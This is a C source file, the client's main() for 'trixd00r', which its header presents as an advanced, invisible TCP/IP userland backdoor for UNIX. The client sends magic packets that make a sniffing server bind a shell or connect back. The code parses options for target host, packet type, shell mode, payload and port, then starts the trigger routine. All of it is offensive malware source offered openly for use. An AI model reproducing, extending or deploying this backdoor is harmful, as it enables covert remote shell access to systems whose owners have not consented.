/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          *
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * client/src/trixd00r.c                                                       *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/

#include "trixd00r.h"
#include "checks.h"
#include "wrapper.h"
#include "help.h"
#include "verbose.h"

#include <getopt.h>


/* let's go... */
int main(int argc, char *argv[])
{
    int c = 0;
    ctrl_t *ctrl = NULL;


    /* banner is very important */
    banner();
    check_argc(argc);
    ctrl = alloc_structs();
    ctrl = set_ctrl_defaults(ctrl);

    while ((c = getopt(argc, argv, "h:t:s:m:p:vVH")) != -1) {
        switch (c) {
         case 'h':
             check_host(optarg);
             ctrl->packet->host = convert_host(optarg);
             break;
         case 't':
             check_pkt_type(ctrl, optarg);
             ctrl->packet->type = (unsigned char) ATOI(optarg);
             break;
         case 's':
             check_shell_mode(ctrl, optarg);
             ctrl->shell->mode = (unsigned char) ATOI(optarg);
             break;
         case 'm':
             ctrl->packet->payload = optarg;
             break;
         case 'p':
             check_port(ctrl, ATOI(optarg));
             ctrl->packet->port = (uint16_t) ATOI(optarg);
             break;
         case 'v':
             ctrl->verbose = VERBOSE;
             break;
         case 'V':
             puts(VERSION);
             __EXIT_SUCCESS;
             break;
         case 'H':
             usage();
             __EXIT_SUCCESS;
             break;
         default:
             __EXIT_FAILURE;
        }
    }

    /* few checks before we can go on */
    __VERBOSE_ARGS;
    check_args(ctrl);
    check_uid(ctrl);

    /* install signal handler */
    install_signals();

    /* let's go */
    start_trixd00r(ctrl);
    end_trixd00r(ctrl);

    return 0;
}

/* EOF */
